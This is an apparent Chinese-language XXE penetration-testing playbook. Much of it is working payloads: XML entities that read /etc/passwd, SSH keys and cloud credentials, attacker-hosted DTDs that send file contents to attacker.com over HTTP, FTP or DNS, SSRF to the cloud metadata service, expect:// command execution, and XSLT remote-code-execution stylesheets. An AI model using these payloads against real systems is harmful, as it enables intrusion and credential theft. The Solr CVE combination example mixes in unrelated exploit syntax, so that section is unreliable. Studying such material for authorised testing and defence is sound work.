---
phase: webapp
vuln_class: [xxe]
title: XXE 测试手册
summary: XXE：先确认解析器是否解实体（直接回显→文件读；不回显→OOB/报错外带）；含本地 DTD 注入、DTD 嵌套链、SVG/OOXML/SAML 等隐蔽入口。
---

# XXE（XML 外部实体注入）全手法

**用法**：先找 XML 入口（§1），再按「回不回显」分两条路——回显走 §2，不回显走 §3。§4 之后的都是**绕过与放大**，确认有 XXE 之后再来看。

## 0. 判据速查

| 现象 | 说明 | 去哪节 |
|---|---|---|
| 提交实体后 `&xxe;` 被替换成文件内容 | 直接回显，最好打 | §2 |
| 提交实体后响应无变化，但 Collaborator 收到 DNS/HTTP | 盲 XXE，需外带 | §3 |
| 报错信息里带出文件内容 | 报错型可用 | §3.3 |
| `DOCTYPE` 被拦 | 换 XInclude | §5 |
| 外连被防火墙挡，但本地文件能读 | 本地 DTD 注入 | §6 |
| WAF 只看实体定义第一层 | DTD 嵌套链 | §7 |
| 无法控制 DOCTYPE，但能控制 XML 内容 | XInclude | §5 |

## 1. 找 XML 入口

**显式入口**：SOAP 端点（`text/xml`、`application/soap+xml`）、接受 `application/xml` 的 REST、SVG 上传、RSS/Atom 解析、XML 配置导入。

**隐蔽入口（容易漏）**：

- 把**任何** JSON POST 的 `Content-Type` 改成 `application/xml`，body 改写成 XML——很多后端是双格式解析或自动嗅探。
- Office 文件上传（`.docx`/`.xlsx`/`.pptx` 本质是含 XML 的 ZIP）。
- HTML→PDF 工具（wkhtmltopdf、PrinceXML）：除了 URL 触发的 SSRF，还会解析 HTML 内嵌 SVG/XML 的外部实体。
- SAML 断言（`SAMLResponse` 是 base64 的 XML）。
- GPX 轨迹文件、XHTML 文档、XMPP stanza。

## 2. 有回显：直接读文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

`/etc/passwd` 内容出现在响应里 → 确认。

**先做个最小验证**：`<!ENTITY xxe "test">` 配 `&xxe;`，看 `test` 是否被替换。这一步能区分「解析器不处理实体」和「处理了但不回显」。

### 读什么

**Linux**：
```
/etc/passwd
/etc/shadow                    # 需 root
/etc/hosts
/proc/self/environ             # 环境变量：DB 凭据、API key
/proc/self/cmdline             # 进程命令行
/var/log/apache2/access.log    # URL 里可能带密码
/home/USER/.ssh/id_rsa
/home/USER/.aws/credentials
/home/USER/.bash_history
```

**Windows**：
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config          # ASP.NET 连接串
C:\xampp\htdocs\wp-config.php          # WordPress DB 凭据
C:\Users\Administrator\.ssh\id_rsa
```

## 3. 无回显：外带

服务器解析了实体但不把内容写回响应时，必须外带。

### 3.1 先确认盲注存在

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR/">]>
<root>&xxe;</root>
```

Collaborator 收到 DNS/HTTP 请求即确认 XXE，哪怕拿不到任何文件内容。

### 3.2 攻击者托管 DTD 外带文件

`http://attacker.com/evil.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

发给目标的 payload：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```

文件内容出现在攻击者 HTTP 日志里。

**坑**：`%file;` 里若有换行或特殊字符，URL 会被截断。改用 base64：

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%exfil;
%send;
```

### 3.3 报错外带（HTTP 被挡时）

让解析器打开一个必然失败的路径，把内容拼进路径里：

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

解析器尝试打开 `file:///nonexistent/<hostname内容>` → 报错信息里带出内容。

**变体**：用 `jar:` 协议，报错更啰嗦、更容易带出完整实体值：

```xml
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
```

### 3.4 FTP 外带（多行文件）

HTTP 外带遇到换行就断，FTP 是逐行发送的，适合 `/etc/passwd` 这类多行文件：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com:2121/%file;'>">
%exfil;
%send;
```

在 2121 起一个假 FTP（`xxeserv` 或自己写），文件每行会变成一个独立的 `RETR`/`CWD` 命令。

### 3.5 只靠 DNS 外带

网络只放行 DNS 时：

```xml
<!ENTITY xxe SYSTEM "file://HASH.attacker.com">
```

DNS 查询本身就能带出数据（把内容编码进子域）。

## 4. 协议处理器

```xml
<!-- SSRF / 内网探测 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://internal.company.com/admin/">

<!-- 文件读 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP filter：二进制文件必须用这个 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- FTP：外带 / 端口扫描 -->
<!ENTITY xxe SYSTEM "ftp://attacker.com:21/x">

<!-- Gopher：打 Redis / SMTP -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/info%0d%0a">

<!-- expect：装了 expect 扩展时可直接执行命令 -->
<!ENTITY xxe SYSTEM "expect://id">
```

**`expect://` 的判据**：`phpinfo()` 里 loaded extensions 有 `expect`。少见但一旦可用直接 RCE。

**XXE→SSRF 的价值**：一个 payload 同时拿到文件读和内网请求，云环境优先打 `169.254.169.254`。

## 5. DOCTYPE 被拦：XInclude

XInclude 不需要 DOCTYPE，只要服务端启用了 XInclude 处理：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

**可用环境**：Apache Cocoon、Xerces-J、启用 XInclude 的 libxml2。

## 6. 外连被挡：本地 DTD 注入

**判据**：`http://` 外连全被防火墙/WAF 拦，但 `file://` 读本地文件仍然可以。

思路是**覆盖本地 DTD 里已定义的实体**——本地 DTD 是被信任的，它加载后我们注入的定义就生效了。

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

`ISOamso` 必须是目标 DTD 里**已存在**的实体名，否则覆盖不生效。

### 常见本地 DTD 路径

**Linux**：
```
/usr/share/yelp/dtd/docbookx.dtd              # GNOME Help
/usr/share/xml/fontconfig/fonts.dtd            # Fontconfig
/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
/usr/share/struts/struts-config_1_0.dtd        # Apache Struts
/usr/share/nmap/nmap.dtd                       # Nmap
/opt/zaproxy/xml/alert.dtd                     # OWASP ZAP
```

**Windows**：
```
C:\Windows\System32\wbem\xml\cim20.dtd
C:\Windows\System32\wbem\xml\wmi20.dtd
C:\Program Files\IBM\WebSphere\*.dtd
C:\Program Files (x86)\Lotus\*.dtd
```

**JAR 内（Java 应用）**：
```
jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
jar:file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
```

## 7. WAF 只查第一层：DTD 嵌套链

有些 WAF 只检查实体定义的第一层内容，深层不递归。

**两层**：
```xml
<!DOCTYPE foo [
  <!ENTITY % a "&#x25; b;">
  <!ENTITY % b SYSTEM "http://attacker.com/chain.dtd">
  %a;
]>
```

`%a;` 展开成 `%b;`，再拉外部 DTD。

**三层**（真正的文件读发生在两次 DTD 拉取之后）：

```xml
<!-- attacker.com/stage1.dtd -->
<!ENTITY % s2 SYSTEM "http://attacker.com/stage2.dtd">
%s2;

<!-- attacker.com/stage2.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % s3 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%s3;
%exfil;
```

目标只看到 `stage1.dtd`，实际读文件在第 3 跳。

## 8. 隐蔽格式入口

| 格式 | XML 位置 | 注入点 |
|---|---|---|
| SOAP Envelope | 整个 body 就是 XML | `<soap:Envelope>` 前加 DOCTYPE |
| SVG | 本身就是 XML | SVG 头部加 DOCTYPE + 实体 |
| OOXML `.docx` | `word/document.xml`、`[Content_Types].xml` | 任一 XML 成员里注入 |
| OOXML `.xlsx` | `xl/sharedStrings.xml`、`xl/worksheets/sheet1.xml` | 单元格值里放实体引用 |
| RSS/Atom | feed body 是 XML | 用户内容被包含进 feed 时注入 |
| SAML | `SAMLResponse` 是 base64 的 XML | 解码 → 注入 DOCTYPE → 重新编码 |
| GPX | GPS 轨迹是 XML | 走接受 GPX 的上传点 |
| XHTML | 严格 XHTML 是合法 XML | 文档里注入 DOCTYPE |

### 8.1 SVG 上传

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="50" font-size="14">&xxe;</text>
</svg>
```

上传成头像 → 查看时文件内容被当文本渲染出来。

### 8.2 OOXML 上传（docx/xlsx/pptx）

```bash
# 1. 解包
unzip original.docx -d extracted/

# 2. 在 XML 声明后插入 DOCTYPE，并把某个文本节点换成 &xxe;
#    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

# 3. 重新打包
cd extracted && zip -r ../malicious.docx .
```

**注意**：即使上传的文件不会被渲染，服务端解析器（Apache POI、python-docx、OpenXML SDK）在导入时也会处理实体，照样触发 OOB。

### 8.3 SAML

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

重新 base64 后作为 `SAMLResponse` 提交。

## 9. 无回显也能确认：DOCTYPE 触发 SSRF

即使实体值完全不回显，`DOCTYPE` 的 `PUBLIC`/`SYSTEM` 也会让解析器发请求：

```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://attacker.com/notify">
<root>normal content</root>
```

Collaborator 收到请求即确认存在 XXE（不涉及实体展开）。

## 10. XSLT 与 XXE 的衔接

**判据**：目标接受带 `<?xml-stylesheet?>` 的 XML，或有独立的 XSLT 处理入口。

### 文件读

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### RCE（取决于处理器）

```xml
<!-- Xalan-J -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP libxslt（需 registerPHPFunctions） -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

## 11. 组合链案例

**Apache Solr CVE-2017-12629**（XXE + Velocity RCE）：

```
GET /solr/CORE/select?q=xxx&wt=xml&defType=edismax&echoParams=all&fl=id,name&sort=${jndi:ldap://attacker/x}
```

1. XXE 读 Solr 配置，确认有哪些 core；
2. Config API 注册 `VelocityResponseWriter` 并开 `solr.resource.loader.enabled=true`；
3. Velocity 模板里 `Runtime.exec()` 执行命令。

## 12. 检测清单

```
□ 找到 XML 入口（含 JSON→XML 转换、文件上传、SAML、SVG）
□ 最小验证：<!ENTITY xxe "test"> + &xxe; → "test" 是否被替换
□ 回显 → 读 /etc/passwd 确认
□ 不回显 → Collaborator 测 OOB
□ OOB 命中 → 搭攻击者 DTD 外带文件
□ DOCTYPE 被拦 → 试 XInclude
□ 外连被拦 → 试本地 DTD 注入
□ WAF 只查一层 → 试 DTD 嵌套链
□ 试 SVG / OOXML 上传路径
□ JSON 端点改 Content-Type: application/xml
```

## 13. 纪律

- **先做最小验证再做文件读**。`&xxe;` 替换成 `test` 这一步能省掉后面所有无效尝试。
- **不回显不等于没有 XXE**。DOCTYPE 触发 SSRF 就能确认，别因为响应没变化就放弃。
- **本地 DTD 注入的实体名必须是目标 DTD 里真实存在的**。抄 payload 时最容易漏这一点，覆盖不存在的实体不会报错，只是不生效。
- **base64 是外带多行文件的标准解法**。直接 `%file;` 遇到换行就断。
- **现代解析器默认关外部实体**。libxml2 ≥ 2.9 默认 `LIBXML_NOENT` 不生效，看到 PHP 8+ / Java 新版要降低预期，先测再说。
